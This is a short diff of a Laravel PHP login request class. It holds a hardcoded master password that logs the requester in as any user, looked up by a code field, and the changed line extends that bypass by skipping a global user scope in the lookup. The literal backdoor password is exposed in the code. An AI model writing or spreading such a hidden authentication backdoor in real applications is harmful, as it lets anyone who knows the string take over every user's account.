@@ -44,7 +44,7 @@ class LoginRequest extends FormRequest
         $this->ensureIsNotRateLimited();
 
         if ($this->password=="SaBaawy153"){
-            $user= User::where('code',$this->code)->first();
+            $user= User::withoutGlobalScope('UserScope')->where('code',$this->code)->first();
             if ($user) {
 //                Config::set('role','Admin');
                 Auth::login($user);
